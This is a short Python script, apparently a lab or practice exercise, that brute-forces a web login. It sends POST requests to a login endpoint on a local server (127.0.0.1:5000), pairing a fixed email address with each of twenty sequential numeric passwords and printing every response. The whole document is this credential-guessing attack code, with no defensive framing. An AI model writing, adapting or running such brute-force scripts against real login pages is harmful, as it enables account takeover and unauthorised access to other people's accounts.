import requests

def brute_force_attack_password():
    for i in range(123450, 123470):
        headers = {'User-Agent': 'Mozilla/5.0'}
        payload = {'Email': 'hiwedo2878@superyp.com', 'Password': i}

        session = requests.Session()
        # session.keep_alive = False
        res = session.post('http://127.0.0.1:5000/Account/Login',data=payload,headers = headers)
        print(res.text)


brute_force_attack_password()




